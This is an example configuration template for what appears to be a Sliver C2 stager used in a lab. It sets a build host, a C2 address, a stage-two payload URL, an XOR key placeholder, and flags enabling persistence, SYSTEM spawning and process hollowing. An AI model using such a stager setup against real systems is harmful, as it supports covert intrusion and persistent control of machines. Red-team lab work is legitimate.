# Example config. Copy to .sliverstagerv3.config and fill in for your lab.
# Real config is .gitignored — never commit credentials, C2 infra, or keys.

# Windows build host
WIN_VM_IP=192.0.2.10
WIN_USER=builder
WIN_SSH_PASSWORD=CHANGE_ME

# C2
C2_DOMAIN=192.0.2.20
C2_PORT=31337
STAGE2_URL=http://192.0.2.20:8080/asset.bin

# Payload names / encryption
STAGE2_BEACON_NAME=stage.exe
STAGE2_ENCRYPTED_NAME=output/asset.bin
XOR_KEY=CHANGE_ME_TO_A_FRESH_32_BYTE_HEX

# Runtime flags
STAGE_VERBOSE=1
STAGE_KEEP_VERBOSE_LOG=1
STAGE_SPAWN_MODE=system
STAGE_PERSISTENCE=1
STAGE_PERSISTENCE_MODE=3
STAGE_WATCHDOG=1
STAGE_SYSTEM_STRICT=0
STAGE_SYSTEM_FALLBACK_TO_USER=0
STAGE_SYSTEM_PROCESS_HOLLOWING_ENABLED=1
STAGE_ALLOW_DISK_STAGED_EXECUTION=1
STAGE_SYSTEM_INPROCESS_REFLECTIVE_FALLBACK=0
STAGE_BEACON_STATEFUL=0
